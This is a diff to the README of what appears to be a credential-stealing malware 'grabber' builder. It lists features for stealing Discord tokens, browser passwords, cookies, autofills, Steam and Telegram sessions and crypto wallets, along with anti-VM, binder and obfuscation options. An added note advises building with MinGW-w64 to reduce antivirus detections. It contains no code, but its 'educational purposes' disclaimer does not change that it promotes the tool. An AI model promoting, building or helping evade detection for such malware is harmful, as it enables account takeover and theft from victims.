@@ -35,7 +35,9 @@
 
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
-**Note:** If the grabber doesn't work, then try to build it again without the "Anti VM" option.
+**Note:** If the grabber fails to function, attempt rebuilding it without enabling the "Anti VM" option.
+
+**Note 2:** To decrease the chances of detections, you can download [MingGW-w64 (with GCC)](https://github.com/niXman/mingw-builds-binaries/releases/download/13.1.0-rt_v11-rev1/x86_64-13.1.0-release-win32-seh-msvcrt-rt_v11-rev1.7z) and include the "bin" folder in the PATH variable.
 
 ## Features
 
@@ -50,7 +52,7 @@
     • Fake Error.
     • EXE Binder.
     • File Pumper.
-    • Obfuscated Stub.
+    • Obfuscated Code.
     • Discord Injection.
     • Steals Discord Tokens.
     • Steals Steam Session.
@@ -59,6 +61,7 @@
     • Steals Passwords From Many Browsers.
     • Steals Cookies From Many Browsers.
     • Steals History From Many Browsers.
+    • Steals Autofills From Many Browsers.
     • Steals Minecraft Session Files.
     • Steals Telegram Session Files.
     • Steals Crypto Wallets.
